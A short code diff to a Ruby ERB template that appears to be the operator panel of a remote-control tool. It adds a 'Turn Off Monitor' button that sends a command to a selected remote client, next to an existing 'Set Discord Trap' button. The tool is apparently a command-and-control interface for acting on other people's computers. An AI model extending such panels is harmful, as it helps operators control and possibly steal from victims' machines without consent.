@@ -115,4 +115,16 @@
       <p>Set Discord Trap</p></button>
     </form>
   </div>
+  <div class="box">
+    <form class="box-content" action="/execute" method="post">
+      <input type="hidden" name="client_id" value="<%= $clientsList[params[:client].to_i].id %>">
+      <input type="hidden" name="client_name" value="<%= $clientsList[params[:client].to_i].name %>">
+      <input type="hidden" name="request" value="turnoffMonitor">
+      <button type="submit">
+      <div class="icon-div">
+        <i class="fa-solid fa-computer fa-2xl"></i>
+      </div>
+      <p>Turn Off Monitor</p></button>
+    </form>
+  </div>
 </div>
